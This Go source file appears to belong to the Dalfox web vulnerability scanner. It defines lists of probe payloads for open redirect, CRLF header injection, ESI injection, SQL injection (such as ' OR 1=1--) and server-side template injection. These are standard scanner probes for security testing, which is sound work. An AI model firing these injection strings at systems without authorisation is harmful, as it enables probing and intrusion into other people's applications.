package payload

// basic open redirect payloads
func GetOpenRedirectPayload() []string {
	payload := []string{
		"//google.com",
		"//google.com/",
		"//google.com/%2f..",
		"///google.com/%2f..",
		"////google.com/%2f..",
		"https://google.com/%2f..",
		"/https://google.com/%2f..",
		"//www.google.com/%2f%2e%2e",
		"///www.google.com/%2f%2e%2e",
		"////www.google.com/%2f%2e%2e",
		"https://www.google.com/%2f%2e%2e",
		"/https://www.google.com/%2f%2e%2e",
		"//google.com/",
		"///google.com/",
		"////google.com/",
		"https://google.com/",
		"/https://google.com/",
		"//google.com//",
		"///google.com//",
		"////google.com//",
		"https://google.com//",
		"//https://google.com//",
		"//www.google.com/%2e%2e%2f",
		"///www.google.com/%2e%2e%2f",
		"////www.google.com/%2e%2e%2f",
		"https://www.google.com/%2e%2e%2f",
		"//https://www.google.com/%2e%2e%2f",
		"///www.google.com/%2e%2e",
		"////www.google.com/%2e%2e",
		"https:///www.google.com/%2e%2e",
		"//https:///www.google.com/%2e%2e",
		"/https://www.google.com/%2e%2e",
		"///www.google.com/%2f%2e%2e",
		"////www.google.com/%2f%2e%2e",
		"https:///www.google.com/%2f%2e%2e",
		"/https://www.google.com/%2f%2e%2e",
		"/https:///www.google.com/%2f%2e%2e",
		"/%09/google.com",
		"//%09/google.com",
		"///%09/google.com",
		"////%09/google.com",
		"https://%09/google.com",
		"/%5cgoogle.com",
		"//%5cgoogle.com",
		"///%5cgoogle.com",
		"////%5cgoogle.com",
		"https://%5cgoogle.com",
		"/https://%5cgoogle.com",
		"https://google.com",
	}
	return payload
}

func GetCRLFPayload() []string {
	payload := []string{
		"%0d%0aDalfoxcrlf: 1234",
		"%E5%98%8D%E5%98%8ADalfoxcrlf: 1234",
		"\\u560d\\u560aDalfoxcrlf: 1234",
	}
	return payload
}

func GetESIIPayload() []string {
	payload := []string{
		"<esi:assign name=\"var1\" value=\"dalfox\"><esii-<esi:vars name=\"$(var1)\">",
	}
	return payload
}

// basic sql injection payloads
func GetSQLIPayload() []string {
	payload := []string{
		"'",
		"''",
		"`",
		"``",
		",",
		"\"",
		"\"\"",
		"/",
		"//",
		";",
		"' or ",
		"-- or #",
		"' OR '1",
		"' OR 1 -- -",
		" OR \"\" = \"",
		"\" OR 1 = 1 -- -",
		"' OR '' = '",
		"'='",
		"'LIKE'",
		"'=0--+",
		"%00",
		" AND 1",
		" AND 0",
		" AND true",
		" AND false",
		" OR 1=1",
		" OR 1=0",
		" OR 1=1#",
		" OR 1=0#",
		" OR 1=1--",
		" OR 1=0--",
		" HAVING 1=1",
		" HAVING 1=0",
		" HAVING 1=1#",
		" HAVING 1=0#",
		" HAVING 1=1--",
		" HAVING 1=0--",
		" AND 1=1",
		" AND 1=0",
		" AND 1=1--",
		" AND 1=0--",
		" AND 1=1#",
		" AND 1=0#",
		" ORDER BY 1",
	}
	return payload
}

// GetSSTIPayload is return SSTI Payloads
func GetSSTIPayload() []string {
	payload := []string{
		"{444*6664}",
		"<%=444*6664%>",
		"#{444*6664}",
		"${{444*6664}}",
		"{{444*6664}}",
		"{{= 444*6664}}",
		"<# 444*6664>",
		"{@444*6664}",
		"[[444*6664]]",
		"${{\"{{\"}}444*6664{{\"}}\"}}",
	}
	return payload
}
